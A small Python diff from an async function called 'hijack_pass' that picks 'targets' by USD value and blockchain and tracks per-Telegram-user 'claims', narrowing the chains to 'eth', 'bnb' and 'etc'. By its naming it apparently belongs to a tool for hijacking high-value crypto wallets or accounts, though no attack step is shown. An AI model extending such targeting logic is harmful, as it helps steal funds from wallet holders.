@@ -14,7 +14,7 @@ async def hijack_pass():
             continue
         rows = db.all("""SELECT t.*, c.state, c.ts AS cts FROM targets t
                          LEFT JOIN claims c ON c.target_id=t.id AND c.tg_id=?
-                         WHERE t.usd >= ? AND t.chain NOT IN ('btc','bch','xmr','nexa','iron','kas')
+                         WHERE t.usd >= ? AND t.chain IN ('eth','bnb','etc')
                          ORDER BY t.score DESC LIMIT 25""", (u["tg_id"], u["min_usd"]))
         for t in rows:
             st, ts = t["state"], t["cts"] or 0
